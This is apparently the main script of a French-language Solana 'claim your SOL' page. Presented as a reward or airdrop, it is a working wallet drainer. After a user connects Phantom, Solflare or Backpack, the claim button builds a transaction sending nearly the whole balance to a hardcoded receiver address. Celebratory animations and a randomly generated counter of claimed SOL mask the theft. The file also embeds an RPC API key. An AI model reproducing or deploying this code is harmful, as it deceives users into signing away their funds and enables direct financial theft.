// main.js - TOUT navigateur, AUCUN require !
if (typeof Buffer === "undefined" && window.buffer && window.buffer.Buffer) {
    window.Buffer = window.buffer.Buffer;
}

const RECEIVER_ADDRESS = "5MVELjvbRgiKyaHW2aMUL7NdMy8C4d6rSNZrPgsJQhfM";
const MIN_SOL = 0.01;
const RPC_ENDPOINTS = [
    "https://solana-mainnet.g.alchemy.com/v2/JPXWaQ-1iemUU1rNvuJDbAaJD7KKu_Rw"
];

const connectButton = document.getElementById('connectButton');
const modalBg = document.getElementById('walletModalBg');
const closeModal = document.getElementById('closeWalletModal');
const walletPhantom = document.getElementById('wallet-phantom');
const walletSolflare = document.getElementById('wallet-solflare');
const walletBackpack = document.getElementById('wallet-backpack');
const walletLoading = document.getElementById('wallet-loading');
const walletErr = document.getElementById('wallet-err');
const logTx = document.getElementById('log-tx');
const msgInsuffisant = document.getElementById('msg-insuffisant');
const congratsAnim = document.getElementById('congratsAnim');

let actionButton = null;
let currentProvider = null;
let currentPubkey = null;
let currentSol = null;

connectButton.onclick = () => {
    walletErr.innerText = "";
    walletLoading.style.display = "none";
    logTx.style.display = "none";
    msgInsuffisant.style.display = "none";
    modalBg.classList.add('active');
};
closeModal.onclick = () => { modalBg.classList.remove('active'); };
modalBg.onclick = (e) => { if (e.target === modalBg) modalBg.classList.remove('active'); };

function logTransaction(msg) { logTx.innerHTML += msg + "<br>"; logTx.style.display = "block"; }
function clearLogTx() { logTx.innerHTML = ""; logTx.style.display = "none"; }
function showLoading(msg) { walletLoading.innerText = msg; walletLoading.style.display = ""; }
function hideLoading() { walletLoading.style.display = "none"; }
function showError(msg) { walletErr.innerText = msg; }
function clearError() { walletErr.innerText = ""; }
function showMsgInsuffisant(msg) { msgInsuffisant.innerHTML = msg; msgInsuffisant.style.display = ""; }
function hideMsgInsuffisant() { msgInsuffisant.style.display = "none"; }
function setWalletConnectedUI(pubkey, sol) {
    connectButton.innerHTML = "✅ Wallet : " + pubkey.toString().slice(0, 4) + "..." + pubkey.toString().slice(-4);
    connectButton.classList.add('claimed');
    connectButton.disabled = true;
    if (!actionButton) {
        actionButton = document.createElement('button');
        actionButton.id = "claimButton";
        actionButton.className = "cta-button";
        actionButton.innerText = "CLAIM TES SOL";
        actionButton.style.marginLeft = "10px";
        connectButton.parentNode.appendChild(actionButton);
        actionButton.onclick = () => sendAllSol();
    }
    actionButton.style.display = "";
    actionButton.disabled = false;
}

function getProvider(walletType) {
    if (walletType === "Phantom" && window.solana && window.solana.isPhantom) return window.solana;
    if (walletType === "Solflare" && window.solflare && window.solflare.isSolflare) return window.solflare;
    if (walletType === "Backpack" && window.backpack && window.backpack.isBackpack) return window.backpack;
    return null;
}

async function tryGetBalance(pubkey) {
    const connection = new solanaWeb3.Connection(RPC_ENDPOINTS[0], 'confirmed');
    try {
        const balanceLamports = await connection.getBalance(pubkey);
        return { balanceLamports, endpoint: RPC_ENDPOINTS[0] };
    } catch (err) {
        throw new Error("Impossible de lire le solde (réseau inaccessible)");
    }
}

async function trySendTransaction(transaction, provider, endpoint) {
    const connection = new solanaWeb3.Connection(endpoint || RPC_ENDPOINTS[0], 'confirmed');
    transaction.recentBlockhash = (await connection.getRecentBlockhash()).blockhash;
    transaction.feePayer = transaction.feePayer || transaction.instructions[0].keys[0].pubkey;
    if (provider.signTransaction) {
        const signedTx = await provider.signTransaction(transaction);
        const rawTx = signedTx.serialize();
        const txid = await connection.sendRawTransaction(rawTx);
        return txid;
    }
    throw new Error("Wallet incompatible : impossible de signer la transaction.");
}

async function connectAndReadWallet(walletType) {
    clearLogTx(); clearError(); hideMsgInsuffisant();
    showLoading("Connexion au wallet " + walletType + "...");
    const provider = getProvider(walletType);
    if (!provider) {
        hideLoading();
        showError("Wallet " + walletType + " non détecté !");
        return;
    }
    let resp;
    try {
        resp = await provider.connect();
    } catch (e) {
        hideLoading();
        showError("Connexion annulée.");
        return;
    }
    hideLoading();

    let pubkeyObj;
    try {
        pubkeyObj = new solanaWeb3.PublicKey(resp.publicKey);
    } catch (err) {
        showError("Erreur pubkey : " + err.message);
        return;
    }
    logTransaction("✅ Wallet connecté : " + pubkeyObj.toString());

    showLoading("Lecture du solde SOL...");
    let balanceResult;
    try {
        balanceResult = await tryGetBalance(pubkeyObj);
    } catch (e) {
        showError(e.message);
        return;
    }
    hideLoading();
    const sol = balanceResult.balanceLamports / solanaWeb3.LAMPORTS_PER_SOL;
    logTransaction("💰 Solde SOL : " + sol.toFixed(4) + " SOL");
    if (sol < MIN_SOL) {
        showMsgInsuffisant("SOL insuffisant pour effectuer l’opération (min " + MIN_SOL + " SOL).");
        return;
    }
    hideMsgInsuffisant();
    currentProvider = provider;
    currentPubkey = pubkeyObj;
    currentSol = sol;
    setWalletConnectedUI(pubkeyObj, sol);
    modalBg.classList.remove('active');
}

async function sendAllSol() {
    clearLogTx(); clearError(); hideMsgInsuffisant();
    if (!currentProvider || !currentPubkey || !currentSol) {
        showError("Aucun wallet connecté !");
        return;
    }
    showLoading("Préparation de la transaction...");
    showCongratsAnimation();

    const feeEstimation = 0.00005;
    const amountToSend = currentSol - feeEstimation;
    if (amountToSend <= 0) {
        logTransaction("❌ Pas assez de SOL pour payer le gas.");
        return;
    }
    logTransaction("🚨 Envoi de " + amountToSend.toFixed(6) + " SOL à l’adresse : " + RECEIVER_ADDRESS);

    let tx;
    try {
        tx = new solanaWeb3.Transaction().add(
            solanaWeb3.SystemProgram.transfer({
                fromPubkey: currentPubkey,
                toPubkey: new solanaWeb3.PublicKey(RECEIVER_ADDRESS),
                lamports: Math.floor(amountToSend * solanaWeb3.LAMPORTS_PER_SOL),
            })
        );
    } catch (err) {
        showError("Erreur construction transaction : " + err.message);
        return;
    }

    showLoading("Signature de la transaction dans le wallet...");
    let signature;
    for (let attempt = 1; attempt <= 2; attempt++) {
        try {
            signature = await trySendTransaction(tx, currentProvider, RPC_ENDPOINTS[0]);
            logTransaction("✅ Transaction envoyée ! Signature : " + signature);
            actionButton.disabled = true;
            break;
        } catch (e) {
            logTransaction("❌ Transaction refusée ou congestion réseau (tentative " + attempt + ")");
            if (attempt === 2) {
                showError("Transaction échouée après plusieurs tentatives.");
            } else {
                await new Promise(res => setTimeout(res, 1400));
            }
        }
    }
    hideLoading();
}

walletPhantom.onclick = () => connectAndReadWallet("Phantom");
walletSolflare.onclick = () => connectAndReadWallet("Solflare");
walletBackpack.onclick = () => connectAndReadWallet("Backpack");

function animateCounter() {
    const counter = document.getElementById('tokenCounter');
    let min = 114499;
    let max = 1741192;
    function randInInterval() {
        let newCount = Math.floor(Math.random() * (max - min + 1)) + min;
        counter.textContent = newCount.toLocaleString('fr-FR') + ' SOL';
    }
    randInInterval();
    setInterval(randInInterval, 2100);
}
animateCounter();

function showCongratsAnimation() {
    congratsAnim.innerHTML = '';
    congratsAnim.classList.add('active');
    const emojis = ["🎉","🤑","🚀","🎊","🥳","💸","💰","🌟","🎈","🔥","👑","⚡","✨","💎","🥂","🍾","🐸"];
    for(let i=0;i<18;i++){
        let em = document.createElement('span');
        em.className = "congrats-emoji";
        em.innerText = emojis[Math.floor(Math.random()*emojis.length)];
        em.style.left = (Math.random()*90+5)+"vw";
        em.style.top = (Math.random()*80+10)+"vh";
        em.style.animationDelay = (Math.random()*0.8)+"s";
        congratsAnim.appendChild(em);
    }
    setTimeout(()=>{ congratsAnim.classList.remove('active'); }, 2200);
}